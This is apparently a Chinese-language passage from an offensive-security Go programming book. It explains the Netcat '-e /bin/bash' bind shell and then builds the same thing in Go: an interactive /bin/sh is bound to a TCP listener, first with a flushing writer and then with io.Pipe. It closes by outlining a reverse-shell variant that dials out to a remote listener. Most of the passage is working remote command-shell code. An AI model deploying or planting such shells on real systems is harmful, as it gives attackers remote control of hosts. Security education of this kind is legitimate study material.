Netcat 被称为 TCP/IP 中的瑞士军刀 —— 本质上是 Telnet 的一个高灵活性，脚本化的版本。它包含一项功能，该功能允许通过 TCP 重定向任何程序的 stdin 和 stdout ，从而使攻击者能够将单个命令执行漏洞转换为操作系统访问。看下面命令：

```bash
$ nc –lp 13337 –e /bin/bash
```

该命令监听在 13337 端口。任何客户端的连接，也可能通过 Telnet ，都能够执行任意的 bash 命令 —— 基于这个原因被称为**巨大的安全漏洞**。Netcat 允许在程序编译期间选择此功能。\(有充足的理由，在标准Linux版本上找到的大多数 Netcat 二进制文件都不包含此功能。\) 接下来在 Go 展示一下这有多么的危险！

先来看下 Go 的 os/exec 包。将用它来执行操作系统中的命令。包中定义了一个 Cmd 的类型，包含运行命令和操作 stdin 和stdout 的必要方法和属性。可以把 stdin \(Reader\) 和 stdout \(Writer\) 定向到Conn实例（既是 Reader 又是 Writer ）。

当收到一个新连接时，可以使用 os/exec 中的 Command\(name string, arg ...string\) 函数创建一个 Cmd 实例。该函数的参数为操作系统命令和任意参数。下面例子中，把硬编码 /bin/sh 为命令，且将 -i 作为参数传递，这样就和交互模式一样了，更可靠的操作 stdin 和 stdout 。

```go
cmd := exec.Command("/bin/sh", "-i")
```

这样就创建了一个 Cmd 实例，但是还没有执行命令。操纵 stdin 和 stdout 有两个选择。像之前讲过的使用 Copy\(Writer, Reader\) ，或者直接给 Cmd 的 Reader 和 Writer 赋值。直接将 Conn 对象赋值给 cmd.Stdin 和 cmd.Stdout, 如下:

```go
cmd.Stdin = conn 
cmd.Stdout = conn
```

完成命令和流的设置后，用 cmd.Run\(\) 执行命令：

```go
if err := cmd.Run(); err != nil { 
    // Handle error.
}
```

在 Linux 系统中完美的运行了。但是，在 Windows 系统上使用 cmd.exe 替换 /bin/bash 调整并运行程序时，会发现连接的客户端并未收到执行命令的结果，这是因为 Windows 对匿名管道的特殊处理。这里有两种解决方法。

首先，调整代码以显式地强制刷新 stdout 来纠正此细微差别。 实现一个封装 bufio.Writer（缓冲写入器）的自定义 Writer，代替直接将 Conn 赋值给 cmd.Stdout，并且调用 Flush 方法强制排空缓冲区。有关 bufio.Writer 的示例用法，请参阅第35页的[“创建Echo服务”](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#创建Echo服务)。

下面是自定义的 writer， Flusher：

```go
// Flusher wraps bufio.Writer, explicitly flushing on all writes. 
type Flusher struct {
    w *bufio.Writer 
}
// NewFlusher creates a new Flusher from an io.Writer. 
func NewFlusher(w io.Writer) *Flusher {
    return &Flusher{
        w: bufio.NewWriter(w),
    } 
}
// Write writes bytes and explicitly flushes buffer. 
❶ func (foo *Flusher) Write(b []byte) (int, error) {
    count, err := foo.w.Write(b)❷
   if err != nil {
        return -1, err 
    }
    if err := foo.w.Flush()❸; err != nil { 
        return -1, err
    }
    return count, err
}
```

Flusher 实现了 Write\(\[\]byte\) 函数，将数据写入底层的缓冲写入器，然后排空输出。

完成自定义的 writer ， 就可以调整链接处理器实例化 Flusher 并赋值给 cmd.Stdout：

```go
func handle(conn net.Conn) {
    // Explicitly calling /bin/sh and using -i for interactive mode 
    // so that we can use it for stdin and stdout.
    // For Windows use exec.Command("cmd.exe").
    cmd := exec.Command("/bin/sh", "-i")
    // Set stdin to our connection 
    cmd.Stdin = conn
    // Create a Flusher from the connection to use for stdout.
    // This ensures stdout is flushed adequately and sent via net.Conn. 
    cmd.Stdout = NewFlusher(conn)

    // Run the command.
    if err := cmd.Run(); err != nil {
        log.Fatalln(err) 
    }
}
```

这种方案虽然可行，但不是很优雅。虽然能工作的代码比优雅的代码重要，但我们将以此问题来介绍 io.Pipe\(\) 函数，Go 的内存中同步管道，可用于连接 Readers 和 Writers ：

```go
func Pipe() (*PipeReader, *PipeWriter)
```

使用 PipeReader 和 PipeWriter 来避免必须显示地排空 writer，并且同步连接 stdout 和 TCP链接。再次重写处理函数：

```go
func handle(conn net.Conn) {
    // Explicitly calling /bin/sh and using -i for interactive mode 
    // so that we can use it for stdin and stdout.
    // For Windows use exec.Command("cmd.exe").
    cmd := exec.Command("/bin/sh", "-i")
    // Set stdin to our connection
    rp, wp := io.Pipe()❶
    cmd.Stdin = conn
  ❷ cmd.Stdout = wp 
  ❸ go io.Copy(conn, rp)
    cmd.Run()
    conn.Close() }
```

调用 io.Pipe\(\) 创建了同步连接的 reader 和 writer —— 任何写入到 writer（即 wp ） 的数据都会被 reader \(rp\) 读取。因此，将 writer 赋值给 cmd.Stdout ，然后使用 Copy\(Writer, Reader\) 将 PipeReader 连接到 TCP 的链接。使用 goroutine 防止代码阻塞。命令的任何标准输出都将发送到 writer ，然后通过管道将 reader 的输出传送到TCP的链接。如此以来就优雅了吧？

这样，就从 TCP 等待连接的的角度成功实现了 Netcat 的巨大的安全漏洞。可以使用类似的逻辑来实现从连接的客户端将本地执行文件的 stdout 和 stdin 重定向到远程监听器。详细的细节留给您确定，但可能包括以下内容：

* 通过 net.Dial\(network, address string\) 和远程监听器建立连接。
* 使用 exec.Command\(name string, arg ...string\) 实例化一个 Cmd。
* 将 net.Conn 对象直接赋值给 Stdin 和 Stdout 。
* 运行命令。

至此，监听器应该能收到连接。发送到客户端的任何数据应在客户端上作为 stdin 处理，而在侦听器上接收的任何数据应作为 stdout 处理。该示例的完整代码在 [_https://github.com/blackhat-go/bhg/ch-2/netcat-exec/_](https://github.com/blackhat-go/bhg/ch-2/netcat-exec/)

## 总结

现在，您已经能开发实际的应用，学会了与网络，I/O 和并发相关的Go 的用法，接下来继续创建可用的 HTTP 客户端。

